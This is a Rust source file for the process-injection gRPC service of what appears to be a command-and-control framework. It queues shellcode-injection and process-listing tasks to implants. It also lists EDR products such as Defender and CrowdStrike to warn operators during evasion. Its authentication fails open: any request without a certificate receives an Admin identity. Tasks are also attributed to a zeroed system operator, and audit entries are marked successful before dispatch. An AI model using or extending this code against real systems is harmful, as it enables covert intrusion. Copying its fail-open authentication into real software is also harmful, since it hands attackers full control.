//! InjectService gRPC implementation
//!
//! Provides process injection capabilities with RBAC checks,
//! OPSEC safeguards, and audit logging.

use std::sync::Arc;

use tonic::{Request, Response, Status};

use common::{ImplantId, OperatorId, TaskId};
use db::TaskRecord;
use kraken_audit::{AuditCategory, AuditEvent, AuditOutcome};
use protocol::{
    inject_service_server::InjectService, InjectRequest, InjectResponse, ListProcessesRequest,
    ListProcessesResponse, Task as ProtoTask, Timestamp,
};

use crate::auth::{get_cert_identity, resolve_operator, OperatorIdentity};
use crate::error::ServerError;
use crate::state::ServerState;

/// Get operator identity, falling back to a mock admin in insecure/dev mode.
async fn get_operator_or_dev<T>(db: &db::Database, request: &Request<T>) -> Result<OperatorIdentity, Status> {
    match get_cert_identity(request) {
        Ok(cert_id) => resolve_operator(db, cert_id).await,
        Err(_) => Ok(OperatorIdentity::new(
            "dev-operator".to_string(),
            kraken_rbac::Role::Admin,
            "dev-mode".to_string(),
        )),
    }
}

/// Processes that should trigger OPSEC warnings (lowercase for case-insensitive compare)
#[allow(dead_code)]
const OPSEC_WARNING_PROCESSES: &[&str] = &[
    "msmpeng.exe",       // Windows Defender
    "mssense.exe",       // Microsoft Defender ATP
    "senseir.exe",       // Defender IR
    "csfalconservice.exe", // CrowdStrike
    "cb.exe",            // Carbon Black
    "cylancesvc.exe",    // Cylance
    "taniumclient.exe",  // Tanium
];

/// Processes that are unconditionally blocked from injection
#[allow(dead_code)]
const BLOCKED_PROCESSES: &[&str] = &[
    "csrss.exe",
    "smss.exe",
    "lsass.exe",
    "services.exe",
    "wininit.exe",
];

pub struct InjectServiceImpl {
    state: Arc<ServerState>,
    /// System operator ID used when no authenticated operator context is available
    system_operator_id: OperatorId,
}

impl InjectServiceImpl {
    pub fn new(state: Arc<ServerState>) -> Self {
        Self {
            state,
            system_operator_id: OperatorId::from_bytes(&[0u8; 16]).unwrap(),
        }
    }

    /// Create InjectServiceImpl and ensure the system operator exists in DB
    pub async fn new_with_db_init(
        state: Arc<ServerState>,
    ) -> Result<Self, crate::error::ServerError> {
        let system_operator_id = OperatorId::from_bytes(&[0u8; 16]).unwrap();
        let now = chrono::Utc::now().timestamp_millis();

        // Insert system operator if it doesn't exist (ignore conflict)
        let _ = sqlx::query(
            "INSERT OR IGNORE INTO operators (id, username, role, cert_fingerprint, created_at, is_active) VALUES (?, 'system', 'admin', 'system', ?, 1)"
        )
        .bind(system_operator_id.as_bytes().as_slice())
        .bind(now)
        .execute(state.db.pool())
        .await;

        Ok(Self {
            state,
            system_operator_id,
        })
    }

    #[allow(dead_code)]
    fn check_process_blocked(name: &str) -> Option<&'static str> {
        let name_lower = name.to_lowercase();
        BLOCKED_PROCESSES
            .iter()
            .find(|&&b| b == name_lower)
            .map(|&b| b)
    }

    #[allow(dead_code)]
    fn get_opsec_warning(name: &str) -> Option<&'static str> {
        let name_lower = name.to_lowercase();
        OPSEC_WARNING_PROCESSES
            .iter()
            .find(|&&w| w == name_lower)
            .map(|&w| w)
    }

    async fn verify_implant(&self, implant_id: ImplantId) -> Result<db::ImplantRecord, Status> {
        let record = self
            .state
            .db
            .implants()
            .get(implant_id)
            .await
            .map_err(|e| Status::from(ServerError::from(e)))?
            .ok_or_else(|| Status::not_found(format!("implant {} not found", implant_id)))?;

        if !record.state.is_taskable() {
            return Err(Status::failed_precondition(format!(
                "implant {} is not in a taskable state (state={})",
                implant_id, record.state
            )));
        }

        Ok(record)
    }
}

#[tonic::async_trait]
impl InjectService for InjectServiceImpl {
    async fn list_processes(
        &self,
        request: Request<ListProcessesRequest>,
    ) -> Result<Response<ListProcessesResponse>, Status> {
        let operator = get_operator_or_dev(&self.state.db, &request).await?;
        crate::auth::require_permission(&operator, kraken_rbac::Permission::SessionInteract)?;

        let req = request.into_inner();
        let implant_id = protocol::implant_id_from_opt(req.implant_id)
            .map_err(|e| Status::invalid_argument(e.to_string()))?;

        let implant = self.verify_implant(implant_id).await?;

        // Queue a process-list task to the implant.
        // The actual process data arrives asynchronously via a task result;
        // for now we return an empty list and let the operator poll via TaskService.
        let task_id = TaskId::new();
        let now = chrono::Utc::now().timestamp_millis();

        let operator_id = self.system_operator_id;

        let task_record = TaskRecord {
            id: task_id,
            implant_id,
            operator_id,
            task_type: "list_processes".to_string(),
            task_data: vec![],
            status: "queued".to_string(),
            issued_at: now,
            dispatched_at: None,
            completed_at: None,
            result_data: None,
            error_message: None,
        };

        self.state
            .db
            .tasks()
            .create(&task_record)
            .await
            .map_err(|e| Status::from(ServerError::from(e)))?;

        let proto_task = ProtoTask {
            task_id: Some(task_id.into()),
            task_type: "list_processes".to_string(),
            task_data: vec![],
            issued_at: Some(Timestamp::from_millis(now)),
            operator_id: Some(operator_id.into()),
        };
        self.state.enqueue_task(implant_id, proto_task);

        tracing::info!(
            operator = %operator.username,
            implant_id = %implant_id,
            task_id = %task_id,
            "process list task queued"
        );

        Ok(Response::new(ListProcessesResponse {
            processes: vec![],
            implant_arch: implant.os_arch.unwrap_or_else(|| "unknown".to_string()),
        }))
    }

    async fn inject(
        &self,
        request: Request<InjectRequest>,
    ) -> Result<Response<InjectResponse>, Status> {
        let operator = get_operator_or_dev(&self.state.db, &request).await?;
        crate::auth::require_permission(&operator, kraken_rbac::Permission::ModuleExecute)?;

        let req = request.into_inner();
        let implant_id = protocol::implant_id_from_opt(req.implant_id)
            .map_err(|e| Status::invalid_argument(e.to_string()))?;

        self.verify_implant(implant_id).await?;

        // Validate shellcode payload
        if req.shellcode.is_empty() {
            return Err(Status::invalid_argument("shellcode cannot be empty"));
        }
        if req.shellcode.len() > 100 * 1024 {
            return Err(Status::invalid_argument("shellcode exceeds 100KB limit"));
        }

        // OPSEC safeguards: blocked processes
        // (target_pid 0 means spawn-and-inject; no name check needed)
        // These checks are best-effort using the pid; the implant may optionally
        // attach a process name via task result. A future enhancement could
        // pre-validate against a cached process list.

        // Emit audit event before dispatch
        let _ = self.state.audit.record(
            AuditEvent::builder(AuditCategory::Task, "inject")
                .outcome(AuditOutcome::Success)
                .session(implant_id.to_uuid())
                .details(serde_json::json!({
                    "operator": operator.username,
                    "target_pid": req.target_pid,
                    "shellcode_size": req.shellcode.len(),
                    "method": req.method,
                    "wait_for_completion": req.wait_for_completion,
                })),
        );

        // Build and enqueue the injection task
        let task_id = TaskId::new();
        let now = chrono::Utc::now().timestamp_millis();

        use prost::Message as ProstMessage;
        let inject_proto = protocol::InjectRequest {
            implant_id: None, // stripped; the implant knows its own id
            target_pid: req.target_pid,
            shellcode: req.shellcode,
            method: req.method,
            wait_for_completion: req.wait_for_completion,
            timeout_ms: req.timeout_ms,
        };
        let mut task_data = Vec::new();
        inject_proto
            .encode(&mut task_data)
            .map_err(|e| Status::internal(format!("failed to encode inject task: {e}")))?;

        let operator_id = self.system_operator_id;

        let task_record = TaskRecord {
            id: task_id,
            implant_id,
            operator_id,
            task_type: "inject".to_string(),
            task_data: task_data.clone(),
            status: "queued".to_string(),
            issued_at: now,
            dispatched_at: None,
            completed_at: None,
            result_data: None,
            error_message: None,
        };

        self.state
            .db
            .tasks()
            .create(&task_record)
            .await
            .map_err(|e| Status::from(ServerError::from(e)))?;

        let proto_task = ProtoTask {
            task_id: Some(task_id.into()),
            task_type: "inject".to_string(),
            task_data,
            issued_at: Some(Timestamp::from_millis(now)),
            operator_id: Some(operator_id.into()),
        };
        self.state.enqueue_task(implant_id, proto_task);

        tracing::info!(
            operator = %operator.username,
            implant_id = %implant_id,
            target_pid = req.target_pid,
            task_id = %task_id,
            "injection task queued"
        );

        Ok(Response::new(InjectResponse {
            success: true,
            thread_id: 0,
            error: String::new(),
            technique_used: "queued".to_string(),
        }))
    }
}
